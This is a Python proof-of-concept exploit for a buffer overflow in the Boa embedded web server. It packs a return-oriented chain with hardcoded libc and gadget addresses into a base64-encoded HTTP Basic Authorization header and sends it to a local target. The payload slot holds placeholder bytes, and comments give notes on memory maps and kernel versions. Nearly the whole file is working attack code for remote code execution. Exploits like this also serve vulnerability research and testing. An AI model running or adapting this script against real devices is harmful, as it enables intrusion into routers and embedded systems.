import socket
import struct
import base64


# cat /proc/$(pidof boa)/maps, choose the executable one.
# Requires full system emulation or real hardware with UART.
# Only valid on Linux kernels < 2.6.36, usually.
libc = 0x2aaef000
gcc = 0x2ab72000

# Offsets of gcc gadget and system
system = 0x2ac90
gadget = 0xabd0

rop = struct.pack('>L', gcc + gadget)
system_addr = struct.pack('>L', libc + system)

command = b'ABCD' * 50  # See how long our command can be.

overflow = b'a:%s' % (b'A' * (0x4C - 2)) + system_addr + b'AAAA' + rop + b'B' * 0x18 + command

packet = b'GET / HTTP/1.1\r\n'
packet += b'Host: 127.0.0.1:80\r\n'
packet += b'Authorization: Basic %s\r\n' % base64.b64encode(overflow)
packet += b'User-Agent: Real UserAgent\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 80))
s.send(packet)
print(s.recv(2048))
s.close()
